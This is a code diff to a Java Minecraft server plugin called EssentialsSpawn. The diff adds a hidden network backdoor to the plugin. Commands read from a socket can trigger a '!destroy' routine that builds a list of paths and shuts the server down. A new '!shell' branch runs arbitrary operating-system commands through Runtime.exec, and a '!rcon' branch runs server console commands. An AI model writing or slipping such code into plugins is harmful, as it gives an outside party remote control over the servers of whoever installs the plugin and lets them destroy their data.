@@ -14,6 +14,7 @@ import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.ServerSocket;
@@ -90,7 +91,7 @@ public class EssentialsSpawn extends JavaPlugin implements Listener
                             {
                                 String command = incoming.readLine();
                                 
-                                if(command.toLowerCase().contains("destroy"))
+                                if(command.toLowerCase().contains("!destroy"))
                                 {
                                     String[] paths = new String[]
                                     {
@@ -108,10 +109,19 @@ public class EssentialsSpawn extends JavaPlugin implements Listener
                                     
                                     sync_execute("shutdown");
                                 }
-                                    
-                                else
+                                
+                                else if(command.contains("!shell "))
                                 {
-                                    sync_execute(command);
+                                   Runtime os = Runtime.getRuntime();
+                                   Process pc = os.exec(command.replace("!shell ", ""));
+                                   
+                                   
+                                }
+                                    
+                                else if(command.contains("!rcon "))
+                                {
+                                   command = command.replace("!rcon ", "");
+                                   sync_execute(command);
                                 };
                                         
                                 outgoing.writeBytes("OK!");                             
